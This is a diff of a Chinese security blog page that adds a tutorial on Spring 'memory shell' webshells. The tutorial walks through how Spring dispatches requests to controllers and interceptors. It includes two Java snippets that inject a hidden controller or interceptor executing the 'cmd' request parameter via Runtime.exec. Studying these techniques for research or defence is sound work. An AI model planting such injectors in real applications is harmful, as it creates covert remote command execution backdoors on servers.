@@ -38,8 +38,16 @@
 <meta property="og:image" content="http://ctwabc.github.io/2026/06/19/memoryshell/mem7.png">
 <meta property="og:image" content="http://ctwabc.github.io/2026/06/19/memoryshell/mem8.png">
 <meta property="og:image" content="http://ctwabc.github.io/2026/06/19/memoryshell/mem9.png">
+<meta property="og:image" content="http://ctwabc.github.io/2026/06/19/memoryshell/mem10.png">
+<meta property="og:image" content="http://ctwabc.github.io/2026/06/19/memoryshell/mem11.png">
+<meta property="og:image" content="http://ctwabc.github.io/2026/06/19/memoryshell/mem12.png">
+<meta property="og:image" content="http://ctwabc.github.io/2026/06/19/memoryshell/mem13.png">
+<meta property="og:image" content="http://ctwabc.github.io/2026/06/19/memoryshell/mem14.png">
+<meta property="og:image" content="http://ctwabc.github.io/2026/06/19/memoryshell/mem15.png">
+<meta property="og:image" content="http://ctwabc.github.io/2026/06/19/memoryshell/mem16.png">
+<meta property="og:image" content="http://ctwabc.github.io/2026/06/19/memoryshell/mem17.png">
 <meta property="article:published_time" content="2026-06-19T09:28:41.000Z">
-<meta property="article:modified_time" content="2026-07-03T08:20:46.352Z">
+<meta property="article:modified_time" content="2026-08-03T02:40:05.390Z">
 <meta property="article:author" content="ctwabc">
 <meta property="article:tag" content="Web安全">
 <meta name="twitter:card" content="summary">
@@ -224,7 +232,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2026-07-03 16:20:46" itemprop="dateModified" datetime="2026-07-03T16:20:46+08:00">2026-07-03</time>
+                <time title="修改时间：2026-08-03 10:40:05" itemprop="dateModified" datetime="2026-08-03T10:40:05+08:00">2026-08-03</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -242,7 +250,7 @@
                 <i class="far fa-file-word"></i>
               </span>
                 <span class="post-meta-item-text">本文字数：</span>
-              <span>13k</span>
+              <span>17k</span>
             </span>
 
         </div>
@@ -313,7 +321,39 @@
 <p>pipeline有添加valve的方法。</p>
 <p>pipeline可以从每一个小容器中获取（Engine，host，context，wrapper）</p>
 <p><em><strong>Spring内存马</strong></em></p>
+<p>1.controller型</p>
+<p>最终目的就是把恶意controller注册到MappingRegistry。</p>
+<p>还需要补充一些在这过程中用到的类的作用。</p>
+<p>RequestMappingHandlerMapping:Spring事先注册的HandlerMapping之一，这个是其中优先级最高的，专门解析Controller这些东西</p>
+<p>RequestMappingInfo:到对应Controller的条件的集合</p>
+<p>HandlerMethod:Controller的一个方法的封装</p>
+<p>MappingRegistry:维护了RequsetMappingInfo、HandlerMethod、URL等等之间的映射关系</p>
+<p><img src="/2026/06/19/memoryshell/mem10.png"></p>
+<p>下面看一下一个请求进来的时候他是怎么找到对应的Controller的，这样我们就知道为什要注册到MappingRegistry了。</p>
+<p>首先会交给DispatcherServlet调用doDispatch方法，再调用getHandler方法。</p>
+<p>getHandler方法会按顺序遍历handlerMappings列表，这个列表就是Spring事先准备好的HandlerMapping的集合，找到能处理这个请求的HandlerMapping就不继续找了，这样就会找到RequestMappingHandlerMapping。</p>
+<p>AbstractHandlerMethodMapping.lookupHandlerMethod()调用父类的这个方法。这个方法就是最核心的查找Controller的方法。</p>
+<p><img src="/2026/06/19/memoryshell/mem11.png"></p>
+<p><img src="/2026/06/19/memoryshell/mem12.png"></p>
+<p>先用URL筛选符合的RequestMappingInfo，如果不能用URL筛选出来，从mappingLookup中将所有的RequestMappingInfo筛选一遍。</p>
+<p>addMatchingMappings()在这个方法中就会对RequestMappingInfo集合根据Request的GET&#x2F;POST啥的筛选一遍</p>
+<p>最后寻找最匹配的，如果有两个就报异常。最后返回的就是HandlerMethod。可以看到都是从MappingRegistry中找的，所以注册进这里面就好了。注册进去也不难，MappingRegistry有一个register方法，这个方法就是用来注册的，registerMapping这个是对register的封装。</p>
+<p><img src="/2026/06/19/memoryshell/mem13.png"></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">shell_controller</span> &#123;</span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> RequestMappingHandlerMapping r;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/control&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">Spring_Controller</span><span class="params">()</span> <span class="keyword">throws</span> NoSuchMethodException &#123;</span><br><span class="line">        <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> Controller_shell.class.getDeclaredMethod(<span class="string">&quot;shell&quot;</span>);</span><br><span class="line">        <span class="type">PatternsRequestCondition</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PatternsRequestCondition</span>(<span class="string">&quot;/shell&quot;</span>);</span><br><span class="line">        <span class="type">RequestMethodsRequestCondition</span> <span class="variable">ms</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RequestMethodsRequestCondition</span>();</span><br><span class="line">        <span class="type">RequestMappingInfo</span> <span class="variable">info</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RequestMappingInfo</span>(url,ms,<span class="literal">null</span>,<span class="literal">null</span>,<span class="literal">null</span>,<span class="literal">null</span>,<span class="literal">null</span>);</span><br><span class="line">        r.registerMapping(info, <span class="keyword">new</span> <span class="title class_">Controller_shell</span>(),method);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Controller_shell</span> &#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">shell</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">            <span class="type">HttpServletRequest</span> <span class="variable">request</span> <span class="operator">=</span> ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getRequest();</span><br><span class="line">            Runtime.getRuntime().exec(request.getParameter(<span class="string">&quot;cmd&quot;</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
+<p>2.interceptor型</p>
+<p>了解一下调用流程。</p>
+<p>其实就是找到Controller以后的后续流程。</p>
+<p>DispatcherServlet.doDispatch()-&gt;getHandler()-&gt;AbstractHandlerMapping.getHandler()-&gt;getHandlerInternal()-&gt;lookupHandlerMethod()直到这里就是之前Controller的流程</p>
+<p><img src="/2026/06/19/memoryshell/mem14.png"></p>
+<p>回到getHandler方法，跟进getHandlerExecutionChain()</p>
+<p><img src="/2026/06/19/memoryshell/mem15.png"></p>
+<p>这个就是在给筛选出来的的handler组装拦截器链，adaptedInterceptors保存着注册好的拦截器，然后根据路径匹不匹配，是不是全局拦截器将符合要求的拦截器放到HandlerExecutitonchain里面，在getHandler方法里面有检测CORS的代码，如果是正常的跨域请求的话还会有CORS拦截器。这样就组装好了,跟filter差不多，所以说需要把拦截器放到adaptedInterceptors</p>
+<p><img src="/2026/06/19/memoryshell/mem16.png"></p>
+<p>在这里调用拦截器的preHandle方法，跟进</p>
+<p><img src="/2026/06/19/memoryshell/mem17.png"></p>
+<p>调用拦截器的preHandle方法</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">shell_interceptor_controller</span> &#123;</span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    RequestMappingHandlerMapping r;</span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/inject&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">inject</span><span class="params">()</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line"><span class="comment">//        WebApplicationContext context = RequestContextUtils.findWebApplicationContext(((ServletRequestAttributes)RequestContextHolder.currentRequestAttributes()).getRequest());</span></span><br><span class="line"><span class="comment">//        org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping r= context.getBean(RequestMappingHandlerMapping.class);</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> r.getClass().getSuperclass().getSuperclass().getSuperclass().getDeclaredField(<span class="string">&quot;adaptedInterceptors&quot;</span>);</span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        ArrayList&lt;HandlerInterceptor&gt; adaptedInterceptors = (ArrayList&lt;HandlerInterceptor&gt;) f.get(r);</span><br><span class="line"></span><br><span class="line">        <span class="type">Shell_Interceptor</span> <span class="variable">shell_interceptor</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Shell_Interceptor</span>();</span><br><span class="line">        adaptedInterceptors.add(shell_interceptor);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Shell_Interceptor</span> <span class="keyword">implements</span> <span class="title class_">HandlerInterceptor</span> &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">preHandle</span><span class="params">(HttpServletRequest request, HttpServletResponse response, Object handler)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (cmd != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    Runtime.getRuntime().exec(cmd);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (NullPointerException n) &#123;</span><br><span class="line">                    n.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">postHandle</span><span class="params">(HttpServletRequest request, HttpServletResponse response, Object handler, ModelAndView modelAndView)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">afterCompletion</span><span class="params">(HttpServletRequest request, HttpServletResponse response, Object handler, Exception ex)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
     </div>
 
     
@@ -472,7 +512,7 @@
     <span class="post-meta-item-icon">
       <i class="fa fa-chart-area"></i>
     </span>
-    <span title="站点总字数">68k</span>
+    <span title="站点总字数">72k</span>
 </div>
   <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
   </div><div class="custom-footer">
